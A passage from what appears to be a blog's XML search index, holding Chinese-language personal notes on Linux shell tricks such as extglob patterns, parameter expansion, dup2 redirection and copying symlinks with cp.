href="https://stackoverflow.com/questions/31255699">double-parenthesis</a> | <a href="https://stackoverflow.com/questions/890262#answer-8339221">&#39;$1 : leading-quote</a> | </li><li>Shell Parameter Expansion有字符串下标索引.</li><li>dup2可用来实现shell的redirection. 还可以指定fd. 好像之前的一题又有新的解决方法了, 不过得用c来写.</li><li>开启了extglob(zsh) | extglob(bash)之后, 可以使用<code>?*+@!(pattern-list)</code>这五种.<br>zsh还可以用<code>^</code>等等, <a href="http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Operators">文档在这儿</a>.<br>知道这些之后就可以更好的filter file了<ul><li><code>rm -r ^(sh|1_sh)</code> </li><li><code>ll ^(|*sh)</code> 两个都加只能这样.</li></ul></li><li><code>cp --preserve=links</code> 或者 <code>cp -av</code>就可以复制symlink了.<br><code>v</code>只是verbose的意思, <code>a</code>覆盖了一些选项, 用于完整的复制文件本身. </li><li><code>while [ 1 ]</code>add spaces between <code>1</code>.</li><li>判断子串: <ul><li><code>$&#123;string##*cd*&#125;</code> 这个##会从string删除匹配字符串就挺神奇的. 得用<code>[ -z ... ]</code>来判断成功.</li></ul></li><li></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
